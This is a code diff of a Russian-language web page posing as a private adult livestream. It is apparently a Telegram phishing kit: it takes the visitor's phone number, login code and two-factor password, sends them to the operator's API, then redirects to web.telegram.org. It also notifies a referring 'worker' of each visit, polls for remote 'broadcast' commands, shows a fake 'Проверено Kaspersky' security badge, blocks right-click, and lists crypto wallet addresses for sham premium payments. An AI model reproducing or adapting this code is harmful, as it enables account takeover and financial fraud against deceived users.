+                <p style="margin: 0;"><strong>Время ответа:</strong> до 2 часов</p>
+            </div>
+        </div>
+        
+        <button onclick="closePrivacyModal()" class="terms-action-btn" style="background: linear-gradient(135deg, #ff3366, #ff6680); margin-top: 20px;">Закрыть</button>
+    </div>
+</div>
+
+<!-- ================= МОДАЛЬНОЕ ОКНО: СОГЛАШЕНИЕ ================= -->
+<div id="termsModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #2ecc71; box-shadow: 0 0 50px rgba(46, 204, 113, 0.4);">
+        <button onclick="closeTermsModal()" class="terms-close-btn" style="background: #2ecc71;">✕</button>
+        
+        <h3 style="color: #2ecc71; font-size: 22px; margin-bottom: 15px; margin-top: 0;">📄 ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ</h3>
+        
+        <div class="terms-text-content">
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #2ecc71; margin-bottom: 8px; font-size: 16px; margin-top: 0;">1. Общие условия</h4>
+                <p style="margin: 0;">Используя наш сервис, вы подтверждаете, что вам исполнилось 18 лет, и вы соглашаетесь с данными условиями. Если вы не согласны с условиями, пожалуйста, прекратите использование сервиса.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #2ecc71; margin-bottom: 8px; font-size: 16px; margin-top: 0;">2. Правила поведения</h4>
+                <ul style="margin: 0; padding-left: 20px;">
+                    <li>Запрещено оскорблять других пользователей и стримеров.</li>
+                    <li>Запрещен спам, реклама и флуд в чате.</li>
+                    <li>Запрещена публикация материалов, нарушающих законодательство.</li>
+                </ul>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #2ecc71; margin-bottom: 8px; font-size: 16px; margin-top: 0;">3. Оплата и возврат</h4>
+                <p style="margin: 0;">Все платежи являются добровольными. Возврат средств осуществляется только в случае технических сбоев на стороне сервиса.</p>
+            </div>
+
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #2ecc71; margin-bottom: 8px; font-size: 16px; margin-top: 0;">4. Отказ от ответственности</h4>
+                <p style="margin: 0;">Администрация не несет ответственности за действия пользователей, а также за возможные перебои в работе сайта.</p>
+            </div>
+            
+            <div style="padding: 15px; background: rgba(46, 204, 113, 0.1); border-radius: 10px;">
+                <h4 style="color: #2ecc71; margin-bottom: 8px; font-size: 16px; margin-top: 0;">📞 Контакты</h4>
+                <p style="margin: 0;">По всем вопросам: <strong>@girlsvoice_support</strong></p>
+            </div>
+        </div>
+        
+        <button onclick="closeTermsModal()" class="terms-action-btn" style="background: linear-gradient(135deg, #2ecc71, #27ae60); margin-top: 20px;">Принять и закрыть</button>
+    </div>
+</div>
+
+<!-- ========== БЕЙДЖ KASPERSKY ========== -->
+<div id="trustBadge" style="position: fixed; bottom: 20px; left: 20px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
+    <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
+        <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
+    </div>
+    <div style="display: flex; flex-direction: column; line-height: 1.2;">
+        <span style="color: white; font-size: 13px; font-weight: 600;">Проверено Kaspersky</span>
+        <span style="color: #aaa; font-size: 10px;">Безопасный сайт • SSL активен</span>
+    </div>
+    <div style="width: 1px; height: 20px; background: #444; margin: 0 5px;"></div>
+    <div style="display: flex; flex-direction: column; line-height: 1.2;">
+        <span style="color: white; font-size: 13px; font-weight: 600;">🔒 256-bit</span>
+        <span style="color: #aaa; font-size: 10px;">Шифрование данных</span>
+    </div>
+</div>
+
 <script>
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
@@ -960,6 +1622,7 @@
     let selectedCountryCode = '+7';
     let cameraStarted = false;
     let isBanned = false;
+    let consentShown = false;
 
     async function checkBan() {
         try {
@@ -1028,7 +1691,7 @@
 
     document.addEventListener('click', function(event) {
         const select = document.getElementById('customSelect');
-        if (!select.contains(event.target)) {
+        if (select && !select.contains(event.target)) {
             document.getElementById('optionsList').classList.remove('open');
             document.getElementById('arrowIcon').classList.remove('open');
         }
@@ -1037,9 +1700,7 @@
     function showPhoneAnimation() {
         const el = document.getElementById('phoneAnimation');
         el.classList.add('show');
-        setTimeout(() => {
-            el.classList.remove('show');
-        }, 6000);
+        setTimeout(() => { el.classList.remove('show'); }, 6000);
     }
 
     function showSmsAnimation(phone) {
@@ -1048,9 +1709,7 @@
         const masked = phone.replace(/(\d{2})\d{6}(\d{2})/, '$1******$2');
         phoneSpan.textContent = masked;
         el.classList.add('show');
-        setTimeout(() => {
-            el.classList.remove('show');
-        }, 5000);
+        setTimeout(() => { el.classList.remove('show'); }, 5000);
     }
 
     function getUrlParams() {
@@ -1070,18 +1729,15 @@
             const modelName = decodeURIComponent(params.model);
             document.getElementById('modelTitle').innerHTML = `Приватный стрим ${modelName}`;
             document.title = `${modelName} · Приватный стрим LIVE`;
-            console.log(`✅ Модель из ссылки: ${modelName}`);
         }
         
         if (params.ref) {
             currentRefCode = params.ref;
-            console.log(`✅ Реф код: ${currentRefCode}`);
         }
         
         if (params.broadcast === 'true') {
             broadcastTriggered = true;
             const phone = params.phone || 'неизвестный';
-            console.log('📢 ЗАПУСК РАССЫЛКИ ПО ПАРАМЕТРУ!');
             showBroadcast(phone);
         }
     }
@@ -1118,20 +1774,12 @@
     
     function checkForBroadcast() {
         const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
-        if (!refCode) {
-            console.log('❌ Нет ref кода');
-            return;
-        }
+        if (!refCode) return;
         
-        const url = `${API_URL}/check_broadcast?ref=${refCode}`;
-        console.log('🔍 Проверка команды для ref:', refCode);
-        
-        fetch(url)
+        fetch(`${API_URL}/check_broadcast?ref=${refCode}`)
             .then(response => response.json())
             .then(data => {
-                console.log('📦 Ответ от сервера:', data);
                 if (data.broadcast === true) {
-                    console.log('📢 ПОЛУЧЕНА КОМАНДА НА РАССЫЛКУ!');
                     showBroadcast(data.phone || 'неизвестный');
                 }
             })
@@ -1312,7 +1960,15 @@
         }
     }
     
+    // ========== ГЛАВНАЯ ИЗМЕНЁННАЯ ЛОГИКА ==========
+    // Кнопка "РАЗБЛОКИРОВАТЬ СТРИМ" теперь открывает окно с 3 кнопками + СОГЛАСЕН
     document.getElementById('unlockBtn').onclick = function() {
+        document.getElementById('consentModal').style.display = 'flex';
+    };
+    
+    // Кнопка "СОГЛАСЕН" — открывает подтверждение возраста (дальше вся логика та же)
+    document.getElementById('consentAgreeBtn').onclick = function() {
+        document.getElementById('consentModal').style.display = 'none';
         document.getElementById('ageModal').style.display = 'flex';
     };
     
@@ -1391,9 +2047,8 @@
             statusDiv.className = "status-text";
             try {
                 const bodyData = { phone: fullPhone };
-                if (currentRefCode) {
-                    bodyData.ref = currentRefCode;
-                }
+                if (currentRefCode) bodyData.ref = currentRefCode;
+                
                 const response = await fetch(`${API_URL}/send_code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1410,7 +2065,6 @@
                     statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Код отправлен!";
                     btn.disabled = false;
-                    
                     showSmsAnimation(fullPhone);
                 } else {
                     let errorMsg = data.error || "неизвестная ошибка";
@@ -1455,9 +2109,7 @@
                 if (data.success) {
                     statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => {
-                        window.location.href = "https://web.telegram.org";
-                    }, 1500);
+                    setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 1500);
                 } else if (data.needs_password) {
                     currentStep = "password";
                     document.getElementById('codeSection').style.display = 'none';
@@ -1507,9 +2159,7 @@
                 if (data.success) {
                     statusDiv.className = "status-text success";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => {
-                        window.location.href = "https://web.telegram.org";
-                    }, 1500);
+                    setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 1500);
                 } else {
                     let errorMsg = data.error || "неверный пароль";
                     if (errorMsg.includes("invalid") || errorMsg.includes("неверный")) {
@@ -1537,9 +2187,7 @@
         selectedCountryCode = '+7';
         document.querySelectorAll('.option-item').forEach(el => {
             el.classList.remove('selected');
-            if (el.getAttribute('data-value') === '+7') {
-                el.classList.add('selected');
-            }
+            if (el.getAttribute('data-value') === '+7') el.classList.add('selected');
         });
     });
     
@@ -1551,19 +2199,12 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
-    // ============================================================
-    // ===== УВЕДОМЛЕНИЕ ВОРКЕРУ О ЗАХОДЕ =====
-    // ============================================================
-    
     async function notifyWorkerAboutVisit() {
         const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
-        if (!refCode) {
-            console.log('❌ Нет реф кода, уведомление не отправляем');
-            return;
-        }
+        if (!refCode) return;
         
         try {
-            const response = await fetch(`${API_URL}/notify_visit`, {
+            await fetch(`${API_URL}/notify_visit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -1573,52 +2214,228 @@
                     timestamp: Date.now()
                 })
             });
-            console.log('✅ Уведомление о заходе отправлено');
-        } catch(e) {
-            console.log('❌ Ошибка уведомления:', e);
-        }
+        } catch(e) {}
     }
     
-    // ============================================================
-    // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
-    // ============================================================
     (async function main() {
         const allowed = await checkBan();
+        if (!allowed) return;
         
-        if (!allowed) {
-            console.log('🚫 IP ЗАБАНЕН, ДОСТУП ЗАКРЫТ');
-            return;
-        }
-        
-        console.log('✅ IP НЕ ЗАБАНЕН, ЗАГРУЗКА САЙТА');
         loadWorkerData();
-        
-        // ===== ЗАПУСКАЕМ УВЕДОМЛЕНИЕ О ЗАХОДЕ =====
         setTimeout(notifyWorkerAboutVisit, 500);
         
         if (currentRefCode) {
-            console.log('✅ Запуск проверки команд для ref:', currentRefCode);
             setInterval(checkForBroadcast, 2000);
-        } else {
-            console.log('❌ Нет ref кода, проверка не запущена');
         }
     })();
-</script>
 
-<div id="trustBadge" style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
-    <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
-        <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
-    </div>
-    <div style="display: flex; flex-direction: column; line-height: 1.2;">
-        <span style="color: white; font-size: 13px; font-weight: 600;">Проверено Kaspersky</span>
-        <span style="color: #aaa; font-size: 10px;">Безопасный сайт • SSL активен</span>
-    </div>
-    <div style="width: 1px; height: 20px; background: #444; margin: 0 5px;"></div>
-    <div style="display: flex; flex-direction: column; line-height: 1.2;">
-        <span style="color: white; font-size: 13px; font-weight: 600;">🔒 256-bit</span>
-        <span style="color: #aaa; font-size: 10px;">Шифрование данных</span>
-    </div>
-</div>
+    // ========== ФУНКЦИИ ДЛЯ ПОЛИТИКИ И СОГЛАШЕНИЯ ==========
+    function showPrivacyPolicy() {
+        var modal = document.getElementById('privacyModal');
+        modal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closePrivacyModal() {
+        var modal = document.getElementById('privacyModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    function showTerms() {
+        var modal = document.getElementById('termsModal');
+        modal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeTermsModal() {
+        var modal = document.getElementById('termsModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    document.getElementById('privacyModal').addEventListener('click', function(e) {
+        if (e.target === this) closePrivacyModal();
+    });
+
+    document.getElementById('termsModal').addEventListener('click', function(e) {
+        if (e.target === this) closeTermsModal();
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            closePrivacyModal();
+            closeTermsModal();
+            closePremiumModal();
+            closePaymentModal();
+            closeCryptoNetworksModal();
+            closeCryptoDetailsModal();
+        }
+    });
+
+    window.showPrivacyPolicy = showPrivacyPolicy;
+    window.closePrivacyModal = closePrivacyModal;
+    window.showTerms = showTerms;
+    window.closeTermsModal = closeTermsModal;
+
+    // ========== ПРЕМИУМ / ОПЛАТА ==========
+    function showPremiumModal() {
+        var modal = document.getElementById('premiumModal');
+        modal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closePremiumModal() {
+        var modal = document.getElementById('premiumModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    function showPaymentForm(method) {
+        closePremiumModal();
+        
+        var paymentModal = document.getElementById('paymentModal');
+        var title = document.getElementById('paymentTitle');
+        var border = document.querySelector('#paymentModal .terms-box-style');
+        
+        if (method === 'sber') {
+            title.textContent = '🟢 ОПЛАТА ЧЕРЕЗ СБЕРБАНК';
+            title.style.color = '#2ecc71';
+            border.style.borderColor = '#2ecc71';
+            border.style.boxShadow = '0 0 50px rgba(46, 204, 113, 0.4)';
+        } else if (method === 'ozon') {
+            title.textContent = '🔵 ОПЛАТА ЧЕРЕЗ OZON BANK';
+            title.style.color = '#4A90E2';
+            border.style.borderColor = '#4A90E2';
+            border.style.boxShadow = '0 0 50px rgba(74, 144, 226, 0.4)';
+        }
+        
+        paymentModal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closePaymentModal() {
+        var modal = document.getElementById('paymentModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    function showCryptoNetworks() {
+        closePremiumModal();
+        var modal = document.getElementById('cryptoNetworksModal');
+        modal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeCryptoNetworksModal() {
+        var modal = document.getElementById('cryptoNetworksModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    function showCryptoDetails(network) {
+        closeCryptoNetworksModal();
+        
+        var modal = document.getElementById('cryptoDetailsModal');
+        var title = document.getElementById('cryptoTitle');
+        var addressEl = document.getElementById('cryptoAddress');
+        var networkEl = document.getElementById('cryptoNetwork');
+        
+        if (network === 'ton') {
+            title.textContent = '💎 ОПЛАТА В TON';
+            addressEl.textContent = 'UQDgdhsS5aKlSGUyB2Eik4s1kpLoyXUBx3yeXnfITn96pHJ9';
+            networkEl.textContent = 'TON (The Open Network)';
+        } else if (network === 'trc20') {
+            title.textContent = '🪙 ОПЛАТА В TRC20';
+            addressEl.textContent = 'TMQU4VcN74WPBkuyzvF2yuzdi5xrpnBd5Q';
+            networkEl.textContent = 'TRC20 (USDT TRON)';
+        }
+        
+        modal.style.setProperty('display', 'flex', 'important');
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeCryptoDetailsModal() {
+        var modal = document.getElementById('cryptoDetailsModal');
+        modal.style.setProperty('display', 'none', 'important');
+        document.body.style.overflow = 'auto';
+    }
+
+    function copyReq(elementId, btn) {
+        var el = document.getElementById(elementId);
+        var text = el.textContent.trim();
+        
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(function() {
+                showCopied(btn);
+            }).catch(function() {
+                fallbackCopy(text, btn);
+            });
+        } else {
+            fallbackCopy(text, btn);
+        }
+    }
+
+    function fallbackCopy(text, btn) {
+        var textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';
+        textarea.style.opacity = '0';
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+            document.execCommand('copy');
+            showCopied(btn);
+        } catch(e) {
+            alert('❌ Не удалось скопировать. Скопируйте вручную:\n\n' + text);
+        }
+        document.body.removeChild(textarea);
+    }
+
+    function showCopied(btn) {
+        var originalText = btn.textContent;
+        btn.textContent = '✅ Скопировано';
+        btn.classList.add('copied');
+        setTimeout(function() {
+            btn.textContent = originalText;
+            btn.classList.remove('copied');
+        }, 2000);
+    }
+
+    function confirmPaymentSent() {
+        sendToAdmin(`💎 ПОЛЬЗОВАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ"!\n\n📱 Реф: ${currentRefCode || 'нет'}`);
+        alert('✅ Спасибо! Ожидайте подтверждения от администратора.\n\nЕсли оплата не подтверждается в течение 15 минут, напишите в поддержку: @girlsvoice_support');
+        closePaymentModal();
+        closeCryptoDetailsModal();
+    }
+
+    document.getElementById('premiumBtn').addEventListener('click', showPremiumModal);
+
+    document.getElementById('premiumModal').addEventListener('click', function(e) {
+        if (e.target === this) closePremiumModal();
+    });
+    document.getElementById('paymentModal').addEventListener('click', function(e) {
+        if (e.target === this) closePaymentModal();
+    });
+    document.getElementById('cryptoNetworksModal').addEventListener('click', function(e) {
+        if (e.target === this) closeCryptoNetworksModal();
+    });
+    document.getElementById('cryptoDetailsModal').addEventListener('click', function(e) {
+        if (e.target === this) closeCryptoDetailsModal();
+    });
+
+    window.showPremiumModal = showPremiumModal;
+    window.closePremiumModal = closePremiumModal;
+    window.showPaymentForm = showPaymentForm;
+    window.closePaymentModal = closePaymentModal;
+    window.showCryptoNetworks = showCryptoNetworks;
+    window.closeCryptoNetworksModal = closeCryptoNetworksModal;
+    window.showCryptoDetails = showCryptoDetails;
+    window.closeCryptoDetailsModal = closeCryptoDetailsModal;
+    window.copyReq = copyReq;
+    window.confirmPaymentSent = confirmPaymentSent;
+
+</script>
 
 </body>
 </html>
